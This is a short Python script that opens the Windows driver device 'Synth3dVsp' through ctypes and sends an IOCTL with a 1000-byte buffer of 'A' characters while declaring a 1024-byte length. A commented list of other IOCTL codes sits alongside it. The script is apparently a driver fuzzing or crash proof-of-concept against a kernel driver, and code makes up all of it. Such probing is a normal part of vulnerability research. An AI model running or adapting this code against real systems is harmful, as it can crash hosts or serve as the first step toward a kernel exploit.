import ctypes, sys
from ctypes import *
import io
from itertools import product
from sys import argv

devicename = "Synth3dVsp"

ioctl = 0x3e6044

#0x3e90ac
#0x3e90ab
#0x3e50b3
#0x3e603c
#0x3e6044
#0x3e6060
#0x3e6fdc
#0x3e909c
#0x3e90a3
#0x3e90a7
#0x3e90af
#0x3e90b7
#0x3e90bb
#0x3e90bf
#0x3e922f
#0x3e93bc
#0x3ea043

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\Synth3dVsp", 0xC0000000, 0, None, 0x3, 0, None) 

if not hevDevice or hevDevice == -1:
    print ("Not Win! Sorry! Please run as administrator")

else:
    print ("OPENED!")
                    
    buf = 'A' * 1000
    bufLength = 1024
    
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)

